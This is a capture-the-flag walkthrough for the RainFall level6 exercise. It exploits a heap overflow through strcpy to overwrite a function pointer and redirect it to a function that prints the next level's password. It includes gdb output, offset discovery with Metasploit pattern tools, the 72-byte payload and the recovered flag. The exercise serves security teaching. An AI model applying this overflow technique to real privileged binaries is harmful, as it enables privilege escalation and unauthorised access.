# Level 6 Walkthrough

In this level, we exploit a heap-based buffer overflow to hijack a function pointer and gain access to the next level’s password.

## Who am I?

```bash
level6@RainFall:~$ id
uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)
```

## Where am I?

```bash
level6@RainFall:~$ ll
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6*
```

We are in possession of a SUID binary owned by level7. Our goal is to exploit this binary to read the `.pass` file from level7.

---

## Program Behavior

Let’s first understand how the binary behaves when run under different conditions.

```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 hello
Nope
```

A segmentation fault occurs when no argument is provided. With one argument, the program prints `Nope` and exits.

---

## Analysis

We now analyze the binary structure and control flow to find an entry point for exploitation.

We start by listing the functions:

```gdb
(gdb) info functions
...
0x08048454  n
0x08048468  m
0x0804847c  main
```

Decompiled logic:

* `main()` allocates two buffers with `malloc()`
* One buffer receives user input via `strcpy()`
* The other buffer holds a function pointer initially set to `m()`
* Finally, the function pointer is called

From the decompiled code:

```c
void main(...) {
  char *dest = malloc(0x40);
  void (**fn)() = malloc(4);
  *fn = m;
  strcpy(dest, argv[1]);
  (*fn)();
}
```

So we control the `strcpy()` destination, and can overflow to overwrite the function pointer `*fn`, which is called afterward.

We also know that the alternate function `n()` executes `system("/bin/cat /home/user/level7/.pass")`, which means it will directly print the password to stdout if we can redirect execution there.

---

## Finding the Overflow Offset

Our next goal is to determine the precise offset needed to overwrite the function pointer.

We use Metasploit’s pattern generator:

```bash
$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5...
```

Run the binary with the pattern:

```gdb
(gdb) run Aa0Aa1Aa2...
...
Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```

Check the EIP value:

```gdb
(gdb) info registers eip
EIP: 0x41346341
```

Find the exact offset:

```bash
$ msf-pattern_offset -q 0x41346341
[*] Exact match at offset 72
```

---

## Redirecting Execution to `n()`

We know that the `n()` function reveals the password. Let’s redirect execution to it.

Function `n()` prints the password using:

```c
system("/bin/cat /home/user/level7/.pass");
```

So we want to overwrite the function pointer at `malloc(4)` with the address of `n()`.
We locate it in GDB:

```gdb
(gdb) p n
$1 = {<text variable, no debug info>} 0x8048454 <n>
```

We build the payload:

```bash
$ python -c "print 'A' * 72 + '\x54\x84\x04\x08'" > /tmp/exploit
```

---

## Triggering the Exploit

Now that we have the payload, let’s test it and gain access to the password.

We first try to run the exploit using redirected input:

```bash
level6@RainFall:~$ python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit
level6@RainFall:~$ cat /tmp/exploit | ./level6
Segmentation fault (core dumped)
```

As expected, this fails because the binary crashes if no argument is provided.

**Correct usage:** We must pass the payload as a command-line argument:

```bash
level6@RainFall:~$ ./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

We successfully redirected execution to the function `n()` and obtained the password.

---

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `asm_analysis.md`: GDB analysis of the binary
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C, faithful to binary)
---

## Conclusion

This final recap explains what vulnerability was exploited and how it led us to success.

This level showcases a classic heap-based overflow where we overwrite a function pointer located in a heap allocation. The use of `strcpy()` without bounds checking lets us go beyond the intended buffer and control execution flow. By carefully analyzing memory layout and offsets, we redirected execution to a desired internal function that gave us access to the next level.

